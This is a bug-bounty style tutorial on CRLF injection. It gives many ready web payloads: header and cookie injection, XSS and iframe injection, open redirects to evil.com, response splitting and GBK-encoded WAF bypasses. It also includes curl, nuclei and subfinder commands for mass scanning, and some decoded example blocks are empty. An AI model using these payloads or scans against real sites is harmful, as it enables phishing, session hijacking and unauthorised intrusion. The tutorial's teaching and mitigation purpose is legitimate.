#### Learn how attackers exploit CRLF Injection to manipulate HTTP responses, hijack headers and unlock hidden vulnerabilities in modern web applications

### Introduction

In web security some vulnerabilities don't get as much attention but can still cause major problems. One of these is **CRLF Injection**. Although it's not as well-known as SQL Injection or Cross-Site Scripting, CRLF Injection can lead to serious issues like HTTP response splitting, web cache poisoning and even XSS attacks all of which can put a website at risk

### What is CRLF Injection?

CRLF stands for Carriage Return (CR, %0d) and Line Feed (LF, %0a), which are special characters used to denote the end of a line in HTTP headers. CRLF Injection occurs when an attacker is able to inject these characters into HTTP headers or responses, manipulating how the server or client interprets the response.

By injecting CRLF sequences, an attacker can prematurely terminate headers and inject arbitrary headers or even body content leading to various attacks such as:

- HTTP Response Splitting
- Web Cache Poisoning
- Cross-Site Scripting (XSS)
- Session Fixation

### How Does CRLF Injection Work?

CRLF Injection relies on the ability to inject a newline character (%0d%0a in URL encoding) into HTTP headers. When these characters are inserted at the wrong place in the response they can break the header structure allowing attackers to introduce custom headers or even manipulate the content of the response.

For example in a web application that doesn't properly sanitize user input, an attacker could inject the following payload into a field that is reflected in the HTTP response headers:

```makefile
%0d%0aX-Injection-Test: injected
```

This payload adds a new header (X-Injection-Test: injected) to the HTTP response.

### Real-World Payload Examples

#### Basic Header Injection

One of the simplest forms of CRLF Injection is when attackers add custom headers. This is done by injecting the %0d%0a sequence:

```yaml
%0d%0aX-Injection-Test: injected
```

This can lead to unauthorized header manipulation or potentially bypass access controls or caching mechanisms.

### Cookie Injection

CRLF Injection can be used to inject new cookies into the HTTP response. This is particularly dangerous when session data or other sensitive information is being managed via cookies

```yaml
%0d%0aSet-Cookie: hacked=true;
```

This payload injects a new cookie (hacked=true) into the response, which could lead to session hijacking or other attacks if exploited in a vulnerable web app.

### HTML Injection

One of the more insidious uses of CRLF Injection is to inject HTML or JavaScript into an HTTP response, which can trigger cross-site scripting (XSS) or unwanted redirects. For example:

```yaml
%0d%0a%3Ch1%3EHTML INJECTION%3C%2Fh1%3E%0A%3Cp%3ECRLF%20Injection%20PoC%3C%2Fh1%3E
```

**Decoded html version:**

```css
<h1>HTML INJECTION</h1>
<p>CRLF Injection PoC by coffin</p>
```


This injects an HTML header (<h1>HTML INJECTION</h1>) and a paragraph (<p>CRLF Injection PoC by coffin</p>), potentially altering the page's content in unexpected ways.

#### Redirection/phishing

CRLF Injection can be used to inject links that redirect users to phishing sites:

```yaml
%0d%0a%0d%0a%3CA%20HREF%3D%22https%3A%2F%2Fexample.com%2F%22%3ELogin%20Here%20%3C%2FA%3E%0A%0A
```

**Decoded html version:**

```xml
<A HREF="https://example.com/">Login Here </A>
```

This injects a hidden link that could be used to trick users into clicking on a fake site login page. which could be used in social engineering or phishing attacks.

#### Injecting Dangerous HTML Elements

A common and dangerous use of CRLF Injection is to inject JavaScript code that executes in the victim's browser leading to XSS attacks. For example an attacker can inject HTML elements with event handlers that trigger JavaScript execution.

```yaml
%0d%0a%0d%0a%3Cimg%20src%3Dx%20onerror%3Dprompt%281%29%3E
```

**Decoded html version:**

```xml
```

In this case the attacker uses an image with a broken src to trigger a JavaScript error which can execute arbitrary JavaScript code. which can be used to steal cookies, hijack sessions or perform other malicious actions.

### Open Redirect

CRLF Injection can also be used to perform open redirect attacks by injecting a new Location header into the HTTP response. When successful this forces the browser to redirect the user to a malicious site which is often used in phishing campaigns.

```yaml
%0d%0aLocation:%20https://evil.com
```

By injecting a new Location header using CRLF (%0d%0a), the server may interpret it as a legitimate redirect command. If the application does not sanitize user input properly, the browser will redirect the user to [https://evil.com](https://evil.com).

### XSS Injection

Another common use of CRLF Injection is to insert JavaScript into an HTTP response, which can lead to Cross-Site Scripting (XSS). This allows attackers to run malicious scripts in the victim's browser.

```xml
%0d%0a%0d%0a<script>alert('XSS via CRLF')</script>
```

This payload breaks the response and injects a <script> tag, causing the browser to execute the JavaScript code and display an alert.

#### Redirecting with JavaScript Injection

```yaml
%0d%0a%0d%0a%3Cscript%3Edocument.location.href%3D%22https%3A%2F%2Fevil.com%22%3C%2Fscript%3E
```

**Decoded version:**

```xml
```

This injects a script that redirects the victim to a malicious site (evil.com), which could be used for phishing or malware distribution.

### XSS Protection Bypass

A more advanced use of CRLF Injection involves disabling browser-based XSS protections by injecting custom HTTP headers. Attackers can insert the X-XSS-Protection: 0 header, which tells the browser to ignore built-in protections against reflected XSS.


```yaml
%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.cookie%29%3C/script%3E
```

**Decoded version:**

```xml
?
Location:
Content-Type:text/html
X-XSS-Protection:0

```

- Injects new headers (including disabling X-XSS-Protection)
- Breaks the HTTP response
- Inserts malicious JavaScript into the body, leading to a potential **XSS attack**

In this payload, the attacker disables XSS protection and injects a <script> tag that executes alert(document.cookie). This can lead to session hijacking, data theft or other malicious browser-side actions.

### IFrame injection

Similarly, the attacker could inject a hidden iframe to redirect users to a malicious site:

```yaml
%0d%0a%0d%0a%3Ciframe%20src%3D%22https%3A%2F%2Fwww.nasa.gov%2F%22%20style%3D%22border%3A%200%3B%20position%3Afixed%3B%20top%3A0%3B%20left%3A0%3B%20right%3A0%3B%20bottom%3A0%3B%20width%3A100%25%3B%20height%3A100%25%22%3E%0A
```

**Decoded version:**

```xml
```

This payload creates a full-page embedded iframe that loads the NASA website and overlays it completely over the current page, which can be used for **clickjacking** or phishing attacks.

### HTTP Response Splitting

HTTP Response Splitting is a powerful technique made possible by CRLF Injection. By injecting %0d%0a (Carriage Return + Line Feed), an attacker can split the server's HTTP response into two parts. This enables manipulation of headers and body content in unexpected ways.

```yaml
/vulnerable-endpoint?q=abc%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert('Split!')</script>
```

- %0d%0a → Ends the current header line
- Content-Length: 0 → Ends original response
- A new HTTP/1.1 200 OK response starts with a malicious script in the body
- The browser or cache may treat the second part as a new valid response

### Bypass Technique (GBK Encoding Payload)

When basic CRLF payloads like the following get blocked by WAF:

```yaml
/%0D%0ASet-Cookie:whoami=coffinxp
```

You can bypass the firewall using **GBK-encoded characters** that act like CR and LF. In GBK encoding:

- 嘍 = %E5%98%8D (interpreted as CR)
- 嘊 = %E5%98%8A (interpreted as LF)

**Bypass Payload:**

```yaml
https://example.com/%E5%98%8D%E5%98%8ASet-Cookie:crlfinjection=coffinxp
```

This payload bypasses standard filtering and successfully injects a custom header like:

```javascript
Set-Cookie: crlfinjection=coffinxp
```

XSS Chaining (GBK-encoded <script>)

To escalate CRLF to XSS:

- < = 嘼 = %E5%98%BC
- > = 嘾 = %E5%98%BE

Full Payload for CRLF → XSS (encoded):

```yaml
https://example.com/%E5%98%8D%E5%98%8ASet-Cookie:whoami=coffinxp%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%BCscript%E5%98%BEalert(1);%E5%98%BC/script%E5%98%BE
```

This forces the server to break response headers and inject executable JS into the response body

### How to Hunt

Now let me show you a very simple and effective way to hunt for CRLF injection vulnerabilities.

#### using cURL

One of the easiest ways to test for CRLF Injection is by using the command-line tool cURL. It allows you to send custom requests and observe how the server handles special characters.

```yaml
curl -I "https://example.com/%0d%0aSet-Cookie:crlf=injected;
╭─[coffinxp@Lostsec]─[~]                                                                  (WSL at )─[ 96%]─[12,15:46]
╰─ curl -I "https://example.com/%0d%0aSet-Cookie:crlf=injected;"
HTTP/2 301
date: Mon, 12 May 2025 12:46:42 GMT
content-type: text/html
location: https://example.com/
set-cookie: crlf=injected;
```

In this request:

- %0d%0a represents a CRLF sequence (Carriage Return + Line Feed).
- Injected-Header: test is the custom header we're trying to inject

#### Automate with Nuclei

You can also use my custom **Nuclei template** to easily detect CRLF injection vulnerabilities at scale across multiple target domains.

**Scan a single URL:**

```bash
nuclei -u https://target.com -t cRlf.yaml
```

**Scan a list of subdomains:**

```bash
subfinder -d domain.com -all | nuclei -t cRlf.yaml
```

*Contribute to coffinxp/nuclei-templates development by creating an account on GitHub.*

#### using Loxs tool

You can also use our **Loxs** tool to perform mass scanning for CRLF injection vulnerabilities across multiple targets quickly and efficiently.

#### my nuclei template vs crlfuzz tool

You'll notice the difference my **Nuclei template** detects more vulnerable domains compared to the **Crlfuzz** tool, making it more effective for large-scale CRLF injection hunting.


#### Using Burp Suite

Burp Suite makes it easy to detect CRLF Injection by observing how the server responds to special newline characters in request parameters.

#### Steps:

1. Intercept a request using Burp (e.g., a GET request with a query parameter like ?page=home).
2. Send the request to Repeater.
3. Modify a parameter by injecting CRLF sequences like:

```makefile
home%0d%0aSet-Cookie:injected=1
```

**4. Observe the response**:

- Look for new headers in the response (e.g., a fake Set-Cookie, X-Test, etc.).
- Check if the layout or page breaks, which may indicate header or body manipulation.

> Example:

Original URL:

```bash
https://target.com/page=home
```

Tested with CRLF:

```perl
https://target.com/page=home%0d%0aSet-Cookie:crlf=1
```

If you see Set-Cookie: crlf=1 in the response headers, the site is vulnerable.

### Mitigating CRLF Injection

To prevent CRLF Injection attacks, developers should:

- **Sanitize and Validate Input:** Ensure that any user input that can be reflected in HTTP headers is properly sanitized. This includes stripping out \r (Carriage Return) and \n (Line Feed) characters.
- **Use Safe Functions for Header Manipulation:** Avoid manually constructing headers. Use secure and well-tested libraries to handle HTTP header construction to prevent accidental injection.
- **Output Encoding:** Encode special characters in user input, especially when displaying data in HTTP headers to prevent the insertion of malicious content

### Conclusion

CRLF Injection is a hidden yet powerful vulnerability that can lead to serious issues like XSS, header injection and HTTP response splitting. By understanding how CR and LF characters are interpreted by servers and testing with crafted payloads, you can uncover and fix these flaws to keep your web applications secure
